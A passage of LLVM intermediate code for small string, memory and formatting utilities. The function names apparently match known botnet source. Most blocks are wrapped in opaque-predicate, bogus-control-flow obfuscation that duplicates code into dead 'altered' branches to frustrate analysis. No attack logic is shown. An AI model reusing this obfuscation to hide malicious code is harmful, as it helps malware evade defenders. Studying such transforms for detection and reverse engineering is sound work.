  %87 = load i32, i32* @x.13
  %88 = load i32, i32* @y.14
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %95 = alloca i8*, align 8
  %96 = alloca i32, align 4
  store i8* %0, i8** %95, align 8
  store i32 %1, i32* %96, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  %16 = load i32, i32* @x.15
  %17 = load i32, i32* @y.16
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %24

; <label>:24:                                     ; preds = %originalBBpart240, %originalBBpart2
  %25 = load i32, i32* %12, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %135

; <label>:27:                                     ; preds = %24
  %28 = load i32, i32* %12, align 4
  %29 = sext i32 %28 to i64
  %30 = icmp uge i64 %29, 4
  br i1 %30, label %31, label %93

; <label>:31:                                     ; preds = %27
  %32 = call i32 @rand_next()
  store i32 %32, i32* %14, align 4
  store i32 0, i32* %13, align 4
  br label %33

; <label>:33:                                     ; preds = %originalBBpart26, %31
  %34 = load i32, i32* %13, align 4
  %35 = sext i32 %34 to i64
  %36 = icmp ult i64 %35, 4
  br i1 %36, label %37, label %72

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %14, align 4
  %39 = and i32 %38, 255
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %15, align 1
  %41 = load i32, i32* %14, align 4
  %42 = lshr i32 %41, 8
  store i32 %42, i32* %14, align 4
  %43 = load i8, i8* %15, align 1
  %44 = zext i8 %43 to i32
  %45 = ashr i32 %44, 3
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %15, align 1
  %48 = zext i8 %47 to i64
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* @rand_alphastr.alphaset, i64 0, i64 %48
  %50 = load i8, i8* %49, align 1
  %51 = load i8*, i8** %11, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %11, align 8
  store i8 %50, i8* %51, align 1
  br label %53

; <label>:53:                                     ; preds = %37
  %54 = load i32, i32* @x.15
  %55 = load i32, i32* @y.16
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %13, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %13, align 4
  %64 = load i32, i32* @x.15
  %65 = load i32, i32* @y.16
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %33

; <label>:72:                                     ; preds = %33
  %73 = load i32, i32* @x.15
  %74 = load i32, i32* @y.16
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %72
  %81 = load i32, i32* %12, align 4
  %82 = sext i32 %81 to i64
  %83 = sub i64 %82, 4
  %84 = trunc i64 %83 to i32
  store i32 %84, i32* %12, align 4
  %85 = load i32, i32* @x.15
  %86 = load i32, i32* @y.16
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart213, label %originalBB8alteredBB

originalBBpart213:                                ; preds = %originalBB8
  br label %118

; <label>:93:                                     ; preds = %27
  %94 = load i32, i32* @x.15
  %95 = load i32, i32* @y.16
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %93
  %102 = call i32 @rand_next()
  %103 = zext i32 %102 to i64
  %104 = urem i64 %103, 32
  %105 = trunc i64 %104 to i8
  %106 = load i8*, i8** %11, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %11, align 8
  store i8 %105, i8* %106, align 1
  %108 = load i32, i32* %12, align 4
  %109 = add nsw i32 %108, -1
  store i32 %109, i32* %12, align 4
  %110 = load i32, i32* @x.15
  %111 = load i32, i32* @y.16
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart236, label %originalBB15alteredBB

originalBBpart236:                                ; preds = %originalBB15
  br label %118

; <label>:118:                                    ; preds = %originalBBpart236, %originalBBpart213
  %119 = load i32, i32* @x.15
  %120 = load i32, i32* @y.16
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %118
  %127 = load i32, i32* @x.15
  %128 = load i32, i32* @y.16
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %24

; <label>:135:                                    ; preds = %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %136 = alloca i8*, align 8
  %137 = alloca i32, align 4
  %138 = alloca i32, align 4
  %139 = alloca i32, align 4
  %140 = alloca i8, align 1
  store i8* %0, i8** %136, align 8
  store i32 %1, i32* %137, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %141 = load i32, i32* %13, align 4
  %_ = sub i32 0, %141
  %gen = add i32 %_, 1
  %_2 = sub i32 0, %141
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %141, 1
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %13, align 4
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %72
  %143 = load i32, i32* %12, align 4
  %144 = sext i32 %143 to i64
  %_9 = shl i64 %144, 4
  %_10 = shl i64 %144, 4
  %_11 = shl i64 %144, 4
  %145 = sub i64 %144, 4
  %146 = trunc i64 %145 to i32
  store i32 %146, i32* %12, align 4
  br label %originalBB8

originalBB15alteredBB:                            ; preds = %originalBB15, %93
  %147 = call i32 @rand_next()
  %148 = zext i32 %147 to i64
  %_16 = sub i64 0, %148
  %gen17 = add i64 %_16, 32
  %_18 = sub i64 0, %148
  %gen19 = add i64 %_18, 32
  %_20 = sub i64 %148, 32
  %gen21 = mul i64 %_20, 32
  %_22 = sub i64 0, %148
  %gen23 = add i64 %_22, 32
  %_24 = sub i64 0, %148
  %gen25 = add i64 %_24, 32
  %_26 = shl i64 %148, 32
  %_27 = shl i64 %148, 32
  %149 = urem i64 %148, 32
  %150 = trunc i64 %149 to i8
  %151 = load i8*, i8** %11, align 8
  %152 = getelementptr inbounds i8, i8* %151, i32 1
  store i8* %152, i8** %11, align 8
  store i8 %150, i8* %151, align 1
  %153 = load i32, i32* %12, align 4
  %_28 = sub i32 %153, -1
  %gen29 = mul i32 %_28, -1
  %_30 = sub i32 %153, -1
  %gen31 = mul i32 %_30, -1
  %_32 = shl i32 %153, -1
  %_33 = sub i32 %153, -1
  %gen34 = mul i32 %_33, -1
  %154 = add nsw i32 %153, -1
  store i32 %154, i32* %12, align 4
  br label %originalBB15

originalBB38alteredBB:                            ; preds = %originalBB38, %118
  br label %originalBB38
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = load i32, i32* @x.17
  %3 = load i32, i32* @y.18
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* @x.17
  %13 = load i32, i32* @y.18
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %26, %originalBBpart2
  %21 = load i8*, i8** %10, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %10, align 8
  %23 = load i8, i8* %21, align 1
  %24 = sext i8 %23 to i32
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %29

; <label>:26:                                     ; preds = %20
  %27 = load i32, i32* %11, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %11, align 4
  br label %20

; <label>:29:                                     ; preds = %20
  %30 = load i32, i32* @x.17
  %31 = load i32, i32* @y.18
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  %38 = load i32, i32* %11, align 4
  %39 = load i32, i32* @x.17
  %40 = load i32, i32* @y.18
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %1
  %47 = alloca i8*, align 8
  %48 = alloca i32, align 4
  store i8* %0, i8** %47, align 8
  store i32 0, i32* %48, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  %49 = load i32, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

; <label>:15:                                     ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11

; <label>:21:                                     ; preds = %11
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* @x.19
  %31 = load i32, i32* @y.20
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %21
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %41

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @x.23
  %14 = load i32, i32* @y.24
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i32, i32* %8, align 4
  %22 = load i32, i32* %5, align 4
  %23 = icmp slt i32 %21, %22
  %24 = load i32, i32* @x.23
  %25 = load i32, i32* @y.24
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %41

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i8*, i8** %4, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 10
  br label %41

; <label>:41:                                     ; preds = %32, %originalBBpart2, %9
  %42 = phi i1 [ false, %originalBBpart2 ], [ false, %9 ], [ %40, %32 ]
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %4, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* %8, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %8, align 4
  br label %9

; <label>:53:                                     ; preds = %41
  %54 = load i32, i32* @x.23
  %55 = load i32, i32* @y.24
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %7, align 4
  %63 = icmp eq i32 %62, 0
  %64 = load i32, i32* @x.23
  %65 = load i32, i32* @y.24
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %73

; <label>:72:                                     ; preds = %originalBBpart24
  br label %91

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i32, i32* @x.23
  %75 = load i32, i32* @y.24
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8*, i8** %4, align 8
  %83 = load i32, i32* @x.23
  %84 = load i32, i32* @y.24
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:91:                                     ; preds = %originalBBpart28, %72
  %92 = phi i8* [ null, %72 ], [ %82, %originalBBpart28 ]
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %12
  %93 = load i32, i32* %8, align 4
  %94 = load i32, i32* %5, align 4
  %95 = icmp slt i32 %93, %94
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %96 = load i32, i32* %7, align 4
  %97 = icmp eq i32 %96, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %98 = load i8*, i8** %4, align 8
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.27
  %5 = load i32, i32* @y.28
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.27
  %21 = load i32, i32* @y.28
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart2115, %originalBBpart2
  %29 = load i8*, i8** %13, align 8
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %621

; <label>:33:                                     ; preds = %28
  %34 = load i8*, i8** %13, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %577

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %13, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %41 = load i8*, i8** %13, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %38
  %46 = load i32, i32* @x.27
  %47 = load i32, i32* @y.28
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.27
  %55 = load i32, i32* @y.28
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %621

; <label>:62:                                     ; preds = %38
  %63 = load i8*, i8** %13, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 37
  br i1 %66, label %67, label %84

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* @x.27
  %69 = load i32, i32* @y.28
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %67
  %76 = load i32, i32* @x.27
  %77 = load i32, i32* @y.28
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %578

; <label>:84:                                     ; preds = %62
  %85 = load i8*, i8** %13, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 45
  br i1 %88, label %89, label %92

; <label>:89:                                     ; preds = %84
  %90 = load i8*, i8** %13, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %13, align 8
  store i32 1, i32* %16, align 4
  br label %92

; <label>:92:                                     ; preds = %89, %84
  %93 = load i32, i32* @x.27
  %94 = load i32, i32* @y.28
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = load i32, i32* @x.27
  %102 = load i32, i32* @y.28
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %109

; <label>:109:                                    ; preds = %originalBBpart218, %originalBBpart212
  %110 = load i8*, i8** %13, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 48
  br i1 %113, label %114, label %135

; <label>:114:                                    ; preds = %109
  %115 = load i32, i32* @x.27
  %116 = load i32, i32* @y.28
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %114
  %123 = load i8*, i8** %13, align 8
  %124 = getelementptr inbounds i8, i8* %123, i32 1
  store i8* %124, i8** %13, align 8
  %125 = load i32, i32* %16, align 4
  %126 = or i32 %125, 2
  store i32 %126, i32* %16, align 4
  %127 = load i32, i32* @x.27
  %128 = load i32, i32* @y.28
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart218, label %originalBB14alteredBB

originalBBpart218:                                ; preds = %originalBB14
  br label %109

; <label>:135:                                    ; preds = %109
  br label %136

; <label>:136:                                    ; preds = %157, %135
  %137 = load i8*, i8** %13, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp sge i32 %139, 48
  br i1 %140, label %141, label %146

; <label>:141:                                    ; preds = %136
  %142 = load i8*, i8** %13, align 8
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp sle i32 %144, 57
  br label %146

; <label>:146:                                    ; preds = %141, %136
  %147 = phi i1 [ false, %136 ], [ %145, %141 ]
  br i1 %147, label %148, label %160

; <label>:148:                                    ; preds = %146
  %149 = load i32, i32* %15, align 4
  %150 = mul nsw i32 %149, 10
  store i32 %150, i32* %15, align 4
  %151 = load i8*, i8** %13, align 8
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = sub nsw i32 %153, 48
  %155 = load i32, i32* %15, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %15, align 4
  br label %157

; <label>:157:                                    ; preds = %148
  %158 = load i8*, i8** %13, align 8
  %159 = getelementptr inbounds i8, i8* %158, i32 1
  store i8* %159, i8** %13, align 8
  br label %136

; <label>:160:                                    ; preds = %146
  %161 = load i8*, i8** %13, align 8
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 115
  br i1 %164, label %165, label %230

; <label>:165:                                    ; preds = %160
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 8
  %169 = icmp ule i32 %168, 40
  br i1 %169, label %170, label %176

; <label>:170:                                    ; preds = %165
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %173 = getelementptr i8, i8* %172, i32 %168
  %174 = bitcast i8* %173 to i64*
  %175 = add i32 %168, 8
  store i32 %175, i32* %167, align 8
  br label %181

; <label>:176:                                    ; preds = %165
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %166, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to i64*
  %180 = getelementptr i8, i8* %178, i32 8
  store i8* %180, i8** %177, align 8
  br label %181

; <label>:181:                                    ; preds = %176, %170
  %182 = phi i64* [ %174, %170 ], [ %179, %176 ]
  %183 = load i64, i64* %182, align 8
  %184 = inttoptr i64 %183 to i8*
